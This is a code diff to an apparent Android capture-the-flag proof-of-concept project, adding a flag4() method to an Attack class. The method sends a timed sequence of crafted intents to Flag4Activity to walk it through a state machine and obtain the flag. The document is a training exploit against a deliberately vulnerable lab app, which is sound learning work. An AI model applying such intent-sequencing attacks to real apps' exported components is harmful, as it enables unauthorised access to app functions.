@@ -2,6 +2,8 @@ package com.vishal2376.hextreepoc
 
 import android.content.Context
 import android.content.Intent
+import android.os.Handler
+import android.os.Looper
 import androidx.core.net.toUri
 
 /**
@@ -48,5 +50,28 @@ class Attack(private val context: Context) {
 		Utils.dumpIntent(context, intent, title = "Flag 3 Intent")
 
 		context.startActivity(intent)
+	}
+
+	fun flag4() {
+		val activityPath = "$packageName.activities.Flag4Activity"
+
+		val customActions = listOf(
+			"PREPARE_ACTION",
+			"BUILD_ACTION",
+			"GET_FLAG_ACTION",
+			null
+		)
+
+		customActions.forEachIndexed { i, action ->
+			val intent = Intent()
+			intent.setClassName(packageName, activityPath)
+			intent.action = action
+			intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+
+			Handler(Looper.getMainLooper()).postDelayed({
+				Utils.dumpIntent(context, intent, title = "Flag 4 Intent $i")
+				context.startActivity(intent)
+			}, i * 500L)
+		}
 	}
 }
